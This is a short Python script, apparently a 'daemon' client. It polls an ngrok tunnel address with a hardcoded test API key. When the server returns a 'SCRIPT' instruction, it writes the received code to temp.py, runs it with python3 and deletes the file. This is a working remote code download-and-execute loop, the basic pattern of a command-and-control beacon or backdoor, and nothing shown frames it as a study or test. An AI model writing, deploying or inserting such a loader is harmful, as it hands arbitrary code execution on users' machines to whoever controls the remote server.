import requests
import subprocess
import json
import os

api_key = "3412423422" # test api key
source = "https://9fd4-90-211-254-60.ngrok-free.app"

# Ping the server
response = requests.post(source + '/daemon_check', headers={'X-Api-Key': api_key})

# If the response contains instructions
if response.status_code == 200:
    instructions = response.json()

    # If the instruction is to run a script
    if instructions['type'] == 'SCRIPT':
        script = instructions['code']
        with open('temp.py', 'w') as f:
            f.write(script)
        subprocess.run(["python3", "temp.py"])
        
        # Delete the temporary file after running the script
        os.remove("temp.py")
    elif instructions['type'] == 'PING':
        print("PINGGG")
